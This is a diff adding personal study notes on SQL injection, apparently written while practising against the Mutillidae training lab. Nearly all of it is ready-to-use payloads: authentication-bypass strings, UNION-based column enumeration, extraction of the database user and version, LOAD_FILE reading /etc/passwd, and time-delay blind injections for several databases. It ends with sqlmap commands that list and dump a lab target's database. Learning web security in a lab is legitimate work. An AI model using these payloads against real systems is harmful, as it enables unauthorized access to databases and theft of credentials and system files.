@@ -1,0 +1,72 @@
+Sql Injection:
+
+
+Always give a single space after double hyphens
+' OR 1=1 --
+' OR '1'='1 --
+
+' UNION SELECT NULL -- 
+Here we don't know how many columns are there. So we are giving null value.
+It will give the same error, Now add another null and try again.
+
+' UNION SELECT NULL,NULL -- 
+It will give the same error, Now add another null and try again.
+SO we are adding as much as null values, at one stage you will get the results.
+
+' UNION SELECT NULL,NULL,NULL,NULL,NULL -- 
+So there are 5 columns, now we can replace null with numbers
+
+' UNION SELECT 1,2,3,4,5 -- 
+This will show the vulnerable columns with the number.
+If still you didn't get the results then try adding more numbers.
+
+Here the vulnerable columns are 
+
+' UNION SELECT 1,user(),@@version,4,5 -- 
+Here user() is the current user that is running in server backend.
+@@version is the command to get the version details of db.
+
+' UNION SELECT 1,LOAD_FILE("../../../../../etc/passwd"),3,4,5 -- 
+Here LOAD_FILE() will print the contents of the file we mention
+# Always give a single space after the double hyphens at the end.
+
+
+' ORDER BY 1 -- 
+Now the results will be sorted in ascending order corresponding to column 1.
+If you get error then add +1.
+
+' ORDER BY 2 -- 
+Add +1 till you get an error.
+
+' ORDER BY 6 --
+Now we got the error, which means i has less than 6 columns.
+
+' UNION SELECT null,'a',null -- 
+Here the particular column is getting string as input, so we are giving 'a'.
+
+
+Blind sql - Time Delay Injection
+'; IF (1=2) WAITFOR DELAY '0:0:10' -- 
+'; IF (1=1) WAITFOR DELAY '0:0:10' -- 
+Try both the payloads and see the difference in the loading time.
+
+MySQL - %3B(select sleep(10))-- -;   
+Postgresql - %3B(select pg_sleep(10))-- -;
+
+
+SQL MAP:
+It is an automated sql injection tool.
+
+# Choose the parameter you want to test for sqli and give * after the paramter value like this "username=admin*"
+
+sqlmap -u "http://10.0.2.14/mutillidae/index.php?page=user-info.php&username=admin*&password=pass*&user-info-php-submit-button=View+Account+Details" --tables
+THis will give us all the tables available in db.
+
+sqlmap -u "http://10.0.2.14/mutillidae/index.php?page=user-info.php&username=admin*&password=pass*&user-info-php-submit-button=View+Account+Details" --dump
+A database dump contains a record of the table structure and/or the data from a database.
+
+
+
+
+
+
